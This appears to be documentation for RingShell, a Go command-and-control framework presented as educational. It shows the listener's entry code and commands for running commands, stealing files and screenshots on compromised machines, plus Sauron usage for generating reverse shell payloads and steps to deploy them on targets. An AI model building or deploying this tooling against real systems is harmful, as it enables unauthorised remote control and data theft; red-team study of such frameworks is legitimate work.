# RingShell Project

=== "Description"
    **RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, provided for **educational purposes** in offensive security.  
    It supports HTTP/HTTPS-based communication with reverse shell payloads and can be extended with user-developed payloads.

    RingShell consists of two main components:

    1. **Listener** – An HTTP/HTTPS server that interacts with compromised machines, enabling shell access and file operations.
    2. **Payload Generator (Sauron)** – Generates platform-specific reverse shell payloads using user-supplied network and system details.


=== "Code"
    ``` go title="main.go" linenums="1"
    package main

    import (
        "flag"
        "fmt"
        "www.github.com/MustafaAbdulazizHamza/RingShellListener/Art"
        "www.github.com/MustafaAbdulazizHamza/RingShellListener/Server"
    )

    func main() {
        port := flag.Int("p", 8888, "Port number for the server to listen on")
        https := flag.Bool("https", false, "Enable HTTPS (uses self-signed certificate if no cert/key provided)")
        cert := flag.String("cert", "", "Path to TLS certificate file")
        key := flag.String("key", "", "Path to TLS private key file")
        flag.Parse()

        Art.Art()
        protocol := "HTTP"
        if *https {
            protocol = "HTTPS"
        }
        fmt.Printf("Starting %s server on port %d...\n", protocol, *port)
        Server.Server(*port, *https, *cert, *key)
    }
    ```

    ## 🛰️ RingShell Listener

    A Golang-based interactive interface that enables users to:

    - **Manage sessions** with compromised machines:
    - Execute arbitrary commands
    - Upload/download files
    - Take screenshots
    - Retrieve specific files and images

    - **HTTP/HTTPS communication** with optional self-signed certificate generation

    - **Use scripting** to automate interactions using pre-written RingShell command files

    ### Listener Commands

    | Command | Description |
    |---------|-------------|
    | `bind listening <port> named <name>` | Start a TCP listener for data exfiltration |
    | `bind controlling <port> named <name>` | Start a TCP server for broadcasting commands |
    | `list sessions` | List all active sessions |
    | `list servers listening` | List all listening servers |
    | `list servers controlling` | List all controlling servers |
    | `listen <session_id>` | Select a session to interact with |
    | `set output <path>` | Set output directory for downloaded files |
    | `get file <filepath>` | Download file(s) from the target |
    | `get image <filepath>` | Download image(s) from the target |
    | `get screenshots` | Capture and download screenshots |
    | `upload file <filepath>` | Upload file(s) to the target |
    | `upload executable <filepath>` | Upload and execute file(s) on the target |
    | `import <script.rsh>` | Execute a RingShell script |
    | `kill <server_name>` | Terminate a server |
    | `q!` | Exit the shell |

    ### Listener Flags

    | Flag | Description |
    |------|-------------|
    | `--port` | HTTP server port (default: 8080) |
    | `--https` | Enable HTTPS mode |
    | `--cert` | Path to TLS certificate file |
    | `--key` | Path to TLS key file |

    If `--https` is enabled without `--cert` and `--key`, the listener will generate a self-signed certificate automatically.

    ## 🛠️ Sauron: The Payload Generator

    **Sauron** is a command-line tool that creates reverse shell payloads based on:

    - Listener IP and Port
    - Target OS and architecture
    - Communication protocol (HTTP/HTTPS)
    - TLS verification settings

    ### Sauron Flags

    | Flag | Description |
    |------|-------------|
    | `-ip` | Listener IP address (required) |
    | `-port` | Listener port number (required) |
    | `-os` | Target operating system (required) |
    | `-arch` | Target architecture (required) |
    | `-out` | Output directory for the payload (required) |
    | `-https` | Use HTTPS for communication |
    | `-secure` | Enable TLS certificate verification (for valid certificates) |

    ### Examples

    ```bash
    ./sauron -ip 192.168.1.10 -port 8080 -os windows -arch amd64 -out ./output
    ./sauron -ip 192.168.1.10 -port 443 -os linux -arch amd64 -https -out ./output
    ./sauron -ip 192.168.1.10 -port 443 -os windows -arch amd64 -https -secure -out ./output
    ```

    ## 📦 Prerequisites

    - Linux Machine
    - [Golang](https://golang.org/dl/)

    ---

    ## 🚀 Getting Started

    1. **Clone the repository:**

        ```bash
        git clone https://github.com/MustafaAbdulazizHamza/RingShell.git
        ```

    2. **Build the components:**

        ```bash
        cd RingShell/RingShell
        go build -o ringshell .

        cd ../Sauron
        go build -o sauron .
        ```

    3. **Start the listener:**

        ```bash
        ./ringshell --port 8080
        ./ringshell --port 443 --https
        ./ringshell --port 443 --https --cert server.crt --key server.key
        ```

    4. **Generate a payload:**

        ```bash
        ./sauron -ip <LISTENER_IP> -port <LISTENER_PORT> -os <TARGET_OS> -arch <TARGET_ARCH> -out ./output
        ```

    5. **Deploy the payload** on the target system and interact via the listener.
